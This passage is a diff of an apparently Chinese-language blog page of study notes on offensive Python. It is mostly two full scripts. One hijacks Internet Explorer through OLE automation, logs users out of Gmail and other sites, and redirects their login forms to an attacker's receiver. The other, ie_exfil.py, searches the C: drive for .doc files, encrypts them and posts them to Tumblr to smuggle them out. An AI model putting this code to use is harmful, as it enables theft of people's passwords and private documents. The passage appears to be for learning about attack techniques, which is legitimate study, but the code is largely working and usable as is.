+</span></span><span class=line><span class=cl>            <span class=s2>&#34;owned&#34;</span><span class=p>:</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;accounts.google.com&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;logout_url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://accounts.google.com/Logout?hl=en&amp;continue=&#34;</span>
+</span></span><span class=line><span class=cl>                          <span class=s2>&#34;https://accounts.google.com/&#34;</span>
+</span></span><span class=line><span class=cl>                          <span class=s2>&#34;ServiceLogin</span><span class=si>%3F</span><span class=s2>service%3Dmail&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;logout_form&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;login_form_index&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;owned&#34;</span><span class=p>:</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>target_sites</span><span class=p>[</span><span class=s2>&#34;www.gmail.com&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_sites</span><span class=p>[</span><span class=s2>&#34;accounts.google.com&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>target_sites</span><span class=p>[</span><span class=s2>&#34;mail.google.com&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_sites</span><span class=p>[</span><span class=s2>&#34;accounts.google.com&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>clsid</span> <span class=o>=</span> <span class=s1>&#39;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>windows</span> <span class=o>=</span> <span class=n>win32com</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>Dispatch</span><span class=p>(</span><span class=n>clsid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>wait_for_browser</span><span class=p>(</span><span class=n>browser</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># wait for the browser to finish loading a page</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>browser</span><span class=o>.</span><span class=n>ReadyState</span> <span class=o>!=</span> <span class=mi>4</span> <span class=ow>and</span> <span class=n>browser</span><span class=o>.</span><span class=n>ReadyState</span> <span class=o>!=</span> <span class=s2>&#34;complete&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>browser</span> <span class=ow>in</span> <span class=n>windows</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlparse</span><span class=p>(</span><span class=n>browser</span><span class=o>.</span><span class=n>LocationUrl</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>url</span><span class=o>.</span><span class=n>hostname</span> <span class=ow>in</span> <span class=n>target_sites</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;owned&#34;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                <span class=k>continue</span>
+</span></span><span class=line><span class=cl>            <span class=c1># if there is a URL we can just redirect</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;logout_url&#34;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                <span class=n>browser</span><span class=o>.</span><span class=n>Navigate</span><span class=p>(</span><span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;logout_url&#34;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>                <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>browser</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=c1># retrieve all elements in the document</span>
+</span></span><span class=line><span class=cl>                <span class=n>full_doc</span> <span class=o>=</span> <span class=n>browser</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>all</span>
+</span></span><span class=line><span class=cl>                <span class=c1># iterate looking for the logout form</span>
+</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>full_doc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=c1># find the logout form and submit it</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;logout_form&#34;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>i</span><span class=o>.</span><span class=n>submit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                            <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>browser</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=c1># now we modify the login form</span>
+</span></span><span class=line><span class=cl>                <span class=n>login_index</span> <span class=o>=</span> <span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;login_form_index&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>login_page</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>browser</span><span class=o>.</span><span class=n>LocationUrl</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>browser</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>forms</span><span class=p>[</span><span class=n>login_index</span><span class=p>]</span><span class=o>.</span><span class=n>action</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>                    <span class=n>data_receiver</span><span class=p>,</span> <span class=n>login_page</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>target_sites</span><span class=p>[</span><span class=n>url</span><span class=o>.</span><span class=n>hostname</span><span class=p>][</span><span class=s2>&#34;owned&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>pass</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
+</span></span></code></pre></div><p>這邊的想法是，先把user給logout，再把登入的request傳送到自己的http server來顯示資料，在forward到原本的server</p><p>這邊是攔截ie的資料，那要ie幫忙的方法就是<code>OLE Automation</code>
+就是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>clsid</span> <span class=o>=</span> <span class=s1>&#39;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&#39;</span> <span class=c1># 可以當成程式在windows的是識別碼，就是座號啦</span>
+</span></span><span class=line><span class=cl><span class=c1># 如何拿clsid?</span>
+</span></span><span class=line><span class=cl><span class=c1># https://www.c-sharpcorner.com/blogs/how-to-find-clsid-of-a-dll</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>windows</span> <span class=o>=</span> <span class=n>win32com</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>Dispatch</span><span class=p>(</span><span class=n>clsid</span><span class=p>)</span> <span class=c1># 註冊OLE automation</span>
+</span></span></code></pre></div><p>這兩行做的事</p><hr><p>ie_exfil.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32com.client</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>fnmatch</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_OAEP</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>doc_type</span> <span class=o>=</span> <span class=s2>&#34;.doc&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;test@test.com&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;testpassword&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>public_key</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
+</span></span></span><span class=line><span class=cl><span class=s2>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
+</span></span></span><span class=line><span class=cl><span class=s2>lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
+</span></span></span><span class=line><span class=cl><span class=s2>h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
+</span></span></span><span class=line><span class=cl><span class=s2>2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
+</span></span></span><span class=line><span class=cl><span class=s2>ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
+</span></span></span><span class=line><span class=cl><span class=s2>YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
+</span></span></span><span class=line><span class=cl><span class=s2>1wIDAQAB
+</span></span></span><span class=line><span class=cl><span class=s2>-----END PUBLIC KEY-----&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>wait_for_browser</span><span class=p>(</span><span class=n>browser</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># wait for the browser to finish loading a page</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>browser</span><span class=o>.</span><span class=n>ReadyState</span> <span class=o>!=</span> <span class=mi>4</span> <span class=ow>and</span> <span class=n>browser</span><span class=o>.</span><span class=n>ReadyState</span> <span class=o>!=</span> <span class=s2>&#34;complete&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_string</span><span class=p>(</span><span class=n>plaintext</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_size</span> <span class=o>=</span> <span class=mi>208</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span> <span class=p>(</span><span class=nb>str</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>plaintext</span> <span class=o>=</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Compressing: </span><span class=si>%d</span><span class=s2> bytes&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Encrypting </span><span class=si>%d</span><span class=s2> bytes&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>rsakey</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>importKey</span><span class=p>(</span><span class=n>public_key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rsakey</span> <span class=o>=</span> <span class=n>PKCS1_OAEP</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>rsakey</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>encrypted</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>offset</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>chunk</span> <span class=o>=</span> <span class=n>plaintext</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span> <span class=o>+</span> <span class=n>chunk_size</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span> <span class=o>%</span> <span class=n>chunk_size</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>chunk</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34; &#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>chunk_size</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunk</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>encrypted</span> <span class=o>+=</span> <span class=n>rsakey</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>offset</span> <span class=o>+=</span> <span class=n>chunk_size</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>encrypted</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>encrypted</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Base64 encoded crypto: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypted</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>encrypted</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_post</span><span class=p>(</span><span class=n>filename</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># open and read the file</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>contents</span> <span class=o>=</span> <span class=n>fd</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>encrypted_title</span> <span class=o>=</span> <span class=n>encrypt_string</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>encrypted_body</span> <span class=o>=</span> <span class=n>encrypt_string</span><span class=p>(</span><span class=n>contents</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>encrypted_title</span><span class=p>,</span> <span class=n>encrypted_body</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>random_sleep</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login_to_tumblr</span><span class=p>(</span><span class=n>ie</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># retrieve all elements in the document</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_doc</span> <span class=o>=</span> <span class=n>ie</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>all</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># iterate looking for the logout form</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>full_doc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;signup_email&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>setAttribute</span><span class=p>(</span><span class=s2>&#34;value&#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;signup_password&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>setAttribute</span><span class=p>(</span><span class=s2>&#34;value&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>random_sleep</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># you can be presented with different homepages</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ie</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>forms</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;signup_form&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>ie</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>forms</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>submit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>ie</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>forms</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>submit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>random_sleep</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># the login form is the second form on the page</span>
+</span></span><span class=line><span class=cl>    <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>ie</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>post_to_tumblr</span><span class=p>(</span><span class=n>ie</span><span class=p>,</span> <span class=n>title</span><span class=p>,</span> <span class=n>post</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_doc</span> <span class=o>=</span> <span class=n>ie</span><span class=o>.</span><span class=n>Document</span><span class=o>.</span><span class=n>all</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>full_doc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;post_one&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>setAttribute</span><span class=p>(</span><span class=s2>&#34;value&#34;</span><span class=p>,</span> <span class=n>title</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>title_box</span> <span class=o>=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>focus</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;post_two&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>setAttribute</span><span class=p>(</span><span class=s2>&#34;innerHTML&#34;</span><span class=p>,</span> <span class=n>post</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Set text area&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>focus</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>i</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=s2>&#34;create_post&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Found post button&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>post_form</span> <span class=o>=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>.</span><span class=n>focus</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># move focus away from the main content box        </span>
+</span></span><span class=line><span class=cl>    <span class=n>random_sleep</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>title_box</span><span class=o>.</span><span class=n>focus</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>random_sleep</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># post the form</span>
+</span></span><span class=line><span class=cl>    <span class=n>post_form</span><span class=o>.</span><span class=n>children</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>ie</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>random_sleep</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exfiltrate</span><span class=p>(</span><span class=n>document_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span> <span class=o>=</span> <span class=n>win32com</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>Dispatch</span><span class=p>(</span><span class=s2>&#34;InternetExplorer.Application&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span><span class=o>.</span><span class=n>Visible</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># head to tumblr and login</span>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span><span class=o>.</span><span class=n>Navigate</span><span class=p>(</span><span class=s2>&#34;http://www.tumblr.com/login&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>ie</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Logging in...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>login_to_tumblr</span><span class=p>(</span><span class=n>ie</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Logged in...navigating&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span><span class=o>.</span><span class=n>Navigate</span><span class=p>(</span><span class=s2>&#34;https://www.tumblr.com/new/text&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>wait_for_browser</span><span class=p>(</span><span class=n>ie</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># encrypt the file</span>
+</span></span><span class=line><span class=cl>    <span class=n>title</span><span class=p>,</span> <span class=n>body</span> <span class=o>=</span> <span class=n>encrypt_post</span><span class=p>(</span><span class=n>document_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Creating new post...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>post_to_tumblr</span><span class=p>(</span><span class=n>ie</span><span class=p>,</span> <span class=n>title</span><span class=p>,</span> <span class=n>body</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Posted!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># Destroy the IE instance</span>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span><span class=o>.</span><span class=n>Quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>ie</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># main loop for document discovery</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>parent</span><span class=p>,</span> <span class=n>directories</span><span class=p>,</span> <span class=n>filenames</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=s2>&#34;C:</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>filename</span> <span class=ow>in</span> <span class=n>fnmatch</span><span class=o>.</span><span class=n>filter</span><span class=p>(</span><span class=n>filenames</span><span class=p>,</span> <span class=s2>&#34;*</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>doc_type</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>document_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>parent</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span>
